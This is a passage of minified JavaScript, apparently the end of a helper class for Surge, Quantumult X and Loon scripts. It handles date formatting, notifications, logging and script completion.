RegExp("("+s+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?e[s]:("00"+e[s]).substr((""+e[s]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============系统通知=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`${this.name}, 结束!  ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}
/*****************************************************************************/
